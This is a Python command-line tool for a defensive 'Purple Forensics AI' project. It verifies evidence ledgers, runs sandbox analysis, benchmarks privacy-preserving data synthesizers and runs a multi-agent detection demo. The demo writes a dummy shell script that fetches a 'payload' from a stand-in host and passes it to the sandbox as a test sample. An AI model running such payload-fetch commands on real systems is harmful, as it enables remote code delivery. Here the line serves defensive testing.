"""CLI unificada para Purple Forensics AI (`pfai`)."""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from pfai.integrity.ledger import EvidenceLedger
from pfai.sandbox.sandbox import DockerSandbox, StaticFallbackSandbox, VMaxSandbox
from pfai.tools.forensics import forensic_capabilities


def _cmd_capabilities(_args: argparse.Namespace) -> int:
    print(json.dumps(forensic_capabilities(), indent=2, ensure_ascii=False))
    return 0


def _cmd_verify_ledger(args: argparse.Namespace) -> int:
    ledger = EvidenceLedger(args.ledger)
    res = ledger.verify_detailed()
    print(json.dumps(res, indent=2, ensure_ascii=False))
    return 0 if res["valid"] else 1


def _cmd_analyze_sample(args: argparse.Namespace) -> int:
    if args.backend == "docker":
        backend = DockerSandbox(runtime=args.runtime)
    elif args.backend == "vmax":
        backend = VMaxSandbox()
    else:
        backend = StaticFallbackSandbox()
    res = backend.analyze(args.sample, timeout=args.timeout)
    print(json.dumps(res, indent=2, ensure_ascii=False))
    return 0 if res.get("status") == "ok" else 1


def _cmd_benchmark_privacy(args: argparse.Namespace) -> int:
    from pfai.data.synthetic_flows import generate_netflow_dataset
    from pfai.privacy.synth import benchmark_synthesizers

    df = generate_netflow_dataset(
        counts={
            "benign": args.n_benign,
            "dos": args.n_attack,
            "probe": args.n_attack,
            "bruteforce": args.n_attack,
            "exfil": args.n_attack,
        },
        seed=args.seed,
    )
    split = int(len(df) * 0.7)
    train_df, holdout_df = df.iloc[:split].reset_index(drop=True), df.iloc[split:].reset_index(drop=True)
    methods = tuple(m.strip() for m in args.methods.split(",") if m.strip())
    report = benchmark_synthesizers(
        train_df,
        holdout_df,
        label="family",
        methods=methods,
        ctgan_epochs=args.epochs,
        dp_epochs=args.epochs,
        dp_epsilon=args.epsilon,
    )
    print(json.dumps(report, indent=2, ensure_ascii=False, default=str))
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="pfai", description="Purple Forensics AI CLI")
    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("capabilities", help="Lista binarios forenses/sandbox disponibles en el sistema")

    vl = sub.add_parser("verify-ledger", help="Verifica integridad criptográfica del ledger JSONL")
    vl.add_argument("--ledger", default="evidence_ledger.jsonl")

    an = sub.add_parser("analyze-sample", help="Analiza un archivo en el backend de sandbox elegido")
    an.add_argument("sample", help="Ruta del archivo a analizar")
    an.add_argument("--backend", choices=("static", "docker", "vmax"), default="static")
    an.add_argument("--runtime", default=None, help="Runtime Docker opcional (p. ej. runsc)")
    an.add_argument("--timeout", type=int, default=30)

    bp = sub.add_parser("benchmark-privacy", help="Compara sintetizadores PPML y audita utilidad/riesgo")
    bp.add_argument("--methods", default="dp_tabgan", help="Lista separada por coma: gaussian_copula,ctgan,dp_tabgan")
    bp.add_argument("--n-benign", type=int, default=300)
    bp.add_argument("--n-attack", type=int, default=75)
    bp.add_argument("--epochs", type=int, default=10)
    bp.add_argument("--epsilon", type=float, default=5.0)
    bp.add_argument("--seed", type=int, default=42)

    dm = sub.add_parser("demo", help="Ejecuta el pipeline Purple Team end-to-end")
    dm.add_argument("--ledger", default="demo_ledger.jsonl")
    dm.add_argument("--epochs", type=int, default=25)
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if args.command == "capabilities":
        return _cmd_capabilities(args)
    if args.command == "verify-ledger":
        return _cmd_verify_ledger(args)
    if args.command == "analyze-sample":
        return _cmd_analyze_sample(args)
    if args.command == "benchmark-privacy":
        return _cmd_benchmark_privacy(args)
    if args.command == "demo":
        from pfai.agents.orchestrator import (
            Bus,
            DetectorAgent,
            ForensicAgent,
            RedTeamAgent,
            ReportAgent,
            SandboxAgent,
            TriageAgent,
        )
        from pfai.data.synthetic_flows import generate_netflow_dataset
        from pfai.models.lvgan import LVGAN, LVGANConfig
        from pfai.models.moe import FAMILIES, MoEClassifier
        from pfai.preprocess import TabularEncoder
        from pfai.tools.forensics import Scope
        import asyncio
        import json as _json
        import tempfile
        import numpy as np
        from sklearn.metrics import roc_auc_score

        df = generate_netflow_dataset(seed=7)
        feat_cols = [c for c in df.columns if c != "family"]
        enc = TabularEncoder.from_dataframe(df, exclude=["family"]).fit(df[feat_cols])
        X_all = enc.transform(df[feat_cols])
        y_all = df["family"].map({name: i for i, name in enumerate(FAMILIES)}).to_numpy()

        benign_mask = y_all == 0
        X_ben = X_all[benign_mask]
        split = int(len(X_ben) * 0.8)
        X_tr, X_val = X_ben[:split], X_ben[split:]

        lv = LVGAN(
            LVGANConfig(
                d_in=X_all.shape[1],
                d_z=8,
                hidden=64,
                lr=1e-3,
                beta=0.05,
                batch_size=64,
                epochs=max(args.epochs, 40),
            )
        ).fit(X_tr, verbose=False)
        lv.calibrate(X_val, 0.99)
        X_atk = X_all[~benign_mask]
        auc = roc_auc_score(
            np.r_[np.zeros(len(X_val)), np.ones(len(X_atk))],
            lv.score(np.vstack([X_val, X_atk])),
        )
        moe = MoEClassifier(X_all.shape[1]).fit(X_all, y_all, epochs=args.epochs, class_weights="balanced", verbose=False)

        async def _run():
            bus = Bus()
            DetectorAgent(bus, lv)
            TriageAgent(bus, moe)
            RedTeamAgent(bus, lv)
            ForensicAgent(bus, Scope(["10.0.0.0/8", "192.168.0.0/16"]))
            SandboxAgent(bus, StaticFallbackSandbox())
            rep = ReportAgent(bus, EvidenceLedger(args.ledger))
            await bus.publish("simulate", {"mode": "evasion", "seed_features": X_atk[:3], "meta": {"dst_ip": "10.0.0.5"}})
            await bus.publish("flow", {"features": X_atk[0], "meta": {"dst_ip": "10.0.0.5"}})
            with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as tf:
                tf.write(b"#!/bin/sh\ncurl http://example.invalid/payload\n")
                sample_tmp = tf.name
            try:
                await bus.publish("sample", {"path": sample_tmp, "source": "cli-demo"})
                await bus.run()
            finally:
                Path(sample_tmp).unlink(missing_ok=True)
            return rep.summary()

        summary = asyncio.run(_run())
        print(_json.dumps({"lvgan_auc": round(float(auc), 4), **summary}, indent=2, ensure_ascii=False))
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
